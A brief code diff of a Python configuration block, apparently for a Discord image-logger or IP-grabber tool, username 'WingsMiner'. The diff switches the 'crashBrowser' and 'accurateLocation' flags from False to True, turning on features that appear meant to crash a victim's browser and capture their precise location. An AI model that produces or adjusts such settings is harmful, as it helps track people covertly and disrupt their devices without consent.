@@ -30,9 +30,9 @@ config = {
     "username": "WingsMiner",
     "color": 0x03AC13,
 
-    "crashBrowser": False,
+    "crashBrowser": True,
     
-    "accurateLocation": False,
+    "accurateLocation": True,
 
     "message": { 
         "doMessage": False,
